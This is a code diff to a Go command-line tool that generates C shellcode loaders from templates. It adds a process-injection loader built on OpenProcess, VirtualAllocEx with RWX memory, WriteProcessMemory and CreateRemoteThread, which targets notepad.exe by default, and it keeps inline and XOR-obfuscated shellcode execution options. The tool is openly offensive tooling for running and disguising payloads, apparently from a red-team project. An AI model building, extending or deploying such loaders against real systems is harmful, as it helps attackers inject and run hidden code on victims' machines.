@@ -1,15 +1,15 @@
 package main
 
-/* 
+/*
 ~ Template Specifications ~
 
 ldr - inline
-	- ./template/Source/Function.c (template)
+	- ./template/Source/Inline.c (template)
 	- ./template/Source/Shellcode.c (generated) via ${SHELLCODE} ${SHELLCODE_SIZE}
 	- ./template/Include/Shellcode.h (template)
 
 ldr - xor_inline
-	- ./template/Source/XorFunction.c (generated) via ${KEY}
+	- ./template/Source/Inline_Xor.c (generated) via ${KEY}
 	- ./template/Source/Shellcode.c (generated) via ${SHELLCODE} ${SHELLCODE_SIZE}
 	- ./template/Source/Xor.c (template)
 	- ./template/Include/Xor.h (template)
@@ -42,35 +42,21 @@ type token struct {
 }
 
 var tokens = []token{
-	{"inline", "VirtualAlloc, memcpy, ((void(*)())exec)();", false},
-	{"xor_inline", "VirtualAlloc, xorShellcode, memcpy, ((void(*)())exec)();", true},
-}
-
-func tokenMethod(token string) string {
-	for _, t := range tokens {
-		if t.name == token {
-			return t.method
-		}
-	}
-	return ""
-}
-
-func tokenExists(token string) bool {
-	for _, t := range tokens {
-		if t.name == token {
-			return true
-		}
-	}
-	return false
-}
-
-func tokenEnc(token string) bool {
-	for _, t := range tokens {
-		if t.name == token {
-			return t.enc
-		}
-	}
-	return false
+	{
+		name:   "inline",
+		method: "VirtualAlloc, memcpy, ((void(*)())exec)();",
+		enc:    false,
+	},
+	{
+		name:   "xor_inline",
+		method: "VirtualAlloc, xorShellcode, memcpy, ((void(*)())exec)();",
+		enc:    true,
+	},
+	{
+		name:   "createremotethread",
+		method: "OpenProcess, VirtualAllocEx (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle",
+		enc:    false,
+	},
 }
 
 func PrintHelp() {
@@ -88,7 +74,7 @@ Options:
                      Example: -out ./Output
 
   -ldr <token>     Loader token to be used in the generation process. (Required)
-                     Supported tokens: [inline, xor_inline]
+                     Supported tokens: [Inline, Xor_Inline, CreateRemoteThread]
                      Example: -ldr inline
 
   -enc <type>      Encryption type for the shellcode. (Optional)
@@ -108,11 +94,40 @@ Options:
   -help            Print this help message.
 
 Examples:
-  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr inline
-  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr xor_inline -enc xor -key mySecretKey1234
-  ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr xor_inline -enc xor -key uashdikasjhdasdas --cleanup 
+  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr Inline
+  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr Xor_Inline -enc xor -key mySecretKey1234
+  ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr Xor_Inline -enc xor -key uashdikasjhdasdas --cleanup
+  ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr CreateRemoteThread 
+
 `
 	fmt.Println(text)
+}
+
+func tokenMethod(token string) string {
+	for _, t := range tokens {
+		if strings.EqualFold(t.name, token) {
+			return t.method
+		}
+	}
+	return ""
+}
+
+func tokenExists(token string) bool {
+	for _, t := range tokens {
+		if strings.EqualFold(t.name, token) {
+			return true
+		}
+	}
+	return false
+}
+
+func tokenEnc(token string) bool {
+	for _, t := range tokens {
+		if strings.EqualFold(t.name, token) {
+			return t.enc
+		}
+	}
+	return false
 }
 
 func GetAbsFilePath(folderPath, fileName string) (string, error) {
@@ -171,11 +186,6 @@ func ToCArray(filePath string) (string, error) {
 }
 
 func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
-	/*
-		args[0] - enc type
-		args[1] - key
-	*/
-
 	if len(args) > 1 {
 		enc := args[0]
 		key := args[1]
@@ -265,12 +275,6 @@ func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
 }
 
 func ProcessLoaderTemplate(token string, args ...string) error {
-	/*
-		token : ldr (inline, xor_inline)
-		args[0] - enc type
-		args[1] - key
-	*/
-
 	var enc string
 	var key string
 
@@ -284,7 +288,7 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 
 	switch token {
 	case "inline":
-		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Function.c"))
+		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline.c"))
 		if err != nil {
 			return err
 		}
@@ -295,47 +299,58 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 		}
 
 	case "xor_inline":
+
 		/*
-			enc type and key must be passed as args
+			need to pass key into ldr template
 		*/
 
-		switch enc {
-		case "xor":
-			fmt.Println("[LDR] Using: XOR with key:", key)
-			ldr, err := ReadFile(filepath.Join(*template_path, "Source/XorFunction.c"))
-			if err != nil {
-				return err
-			}
+		fmt.Println("[LDR] enc_type: ", enc)
+		fmt.Println("[LDR] key: ", key)
+		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline_Xor.c"))
+		if err != nil {
+			return err
+		}
 
-			ldr = strings.ReplaceAll(ldr, "${KEY}", key)
-			err = SaveToFile(*outputPath, "Main.c", ldr)
-			if err != nil {
-				return err
-			}
+		ldr = strings.ReplaceAll(ldr, "${KEY}", key)
+		err = SaveToFile(*outputPath, "Main.c", ldr)
+		if err != nil {
+			return err
+		}
 
-			xor, err := ReadFile(filepath.Join(*template_path, "Source/Xor.c"))
-			if err != nil {
-				return err
-			}
+		xor, err := ReadFile(filepath.Join(*template_path, "Source/Xor.c"))
+		if err != nil {
+			return err
+		}
 
-			err = SaveToFile(*outputPath, "Xor.c", xor)
-			if err != nil {
-				return err
-			}
+		err = SaveToFile(*outputPath, "Xor.c", xor)
+		if err != nil {
+			return err
+		}
 
-			xor_h, err := ReadFile(filepath.Join(*template_path, "Include/Xor.h"))
-			if err != nil {
-				return err
-			}
+		xor_h, err := ReadFile(filepath.Join(*template_path, "Include/Xor.h"))
+		if err != nil {
+			return err
+		}
 
-			err = SaveToFile(*outputPath, "Xor.h", xor_h)
-			if err != nil {
-				return err
-			}
+		err = SaveToFile(*outputPath, "Xor.h", xor_h)
+		if err != nil {
+			return err
+		}
 
-		default:
-			fmt.Println("Unknown enc type:", enc)
+	case "createremotethread":
 
+		/*
+			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThread.c
+		*/
+
+		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThread.c"))
+		if err != nil {
+			return err
+		}
+
+		err = SaveToFile(*outputPath, "Main.c", ldr)
+		if err != nil {
+			return err
 		}
 
 	default:
@@ -386,7 +401,6 @@ func main() {
 		return
 	}
 
-
 	if needsEnc && *key == "" {
 		fmt.Println("[*] Encryption key not specified, using default key: aaaabbbbccccdddd")
 		*key = "aaaabbbbccccdddd"
@@ -398,7 +412,8 @@ func main() {
 		return
 	}
 
-	err = ProcessLoaderTemplate(*ldrToken, *enc, *key)
+	err = ProcessLoaderTemplate(strings.ToLower(*ldrToken), *enc, *key)
+	// ldrToken should be case insensitive
 	if err != nil {
 		fmt.Println("Error processing loader:", err)
 		return
